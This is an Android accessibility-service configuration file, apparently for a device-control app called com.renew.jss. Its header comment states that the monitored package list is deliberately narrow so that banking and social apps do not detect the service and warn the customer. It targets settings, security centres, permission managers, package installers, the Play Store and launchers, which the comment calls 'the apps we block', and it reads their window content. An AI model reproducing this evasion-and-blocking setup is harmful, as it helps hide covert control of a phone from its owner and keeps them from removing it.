<?xml version="1.0" encoding="utf-8"?>
<!--
    🛡️ DPC ACCESSIBILITY SERVICE CONFIG
    IMPORTANT: packageNames lists ONLY the packages we actually need to monitor.
    DO NOT use "@null" (all apps) — that causes banking/UPI/social apps to detect
    this service and show "Accessibility settings enabled" warnings to the customer.
    Only list Settings, Launcher, Play Store, and System UI — the apps we block.
-->
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeWindowStateChanged|typeWindowContentChanged"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:accessibilityFlags="flagDefault|flagRetrieveInteractiveWindows"
    android:canRetrieveWindowContent="true"
    android:description="@string/accessibility_service_description"
    android:notificationTimeout="0"
    android:packageNames="com.android.settings,com.samsung.android.settings,com.samsung.accessibility,com.samsung.android.accessibility,com.google.android.settings.intelligence,com.google.android.permissioncontroller,com.miui.securitycenter,com.miui.appmanager,com.coloros.safecenter,com.oppo.safe,com.oplus.notificationmanager,com.oplus.battery,com.iqoo.secure,com.vivo.permissionmanager,com.transsion.phonemanager,com.lenovo.security,com.android.vending,com.android.systemui,com.android.packageinstaller,com.google.android.packageinstaller,com.miui.packageinstaller,com.samsung.android.packageinstaller,com.oplus.packageinstaller,com.vivo.packageinstaller,com.google.android.launcher,com.android.launcher,com.android.launcher2,com.android.launcher3,com.google.android.apps.nexuslauncher,com.miui.home,com.vivo.launcher,com.oppo.launcher,com.realme.launcher,com.bbk.launcher2,com.zte.mifavor.launcher,com.transsion.launcher,com.renew.jss"
    android:settingsActivity="com.renew.jss.activity.MainActivity" />
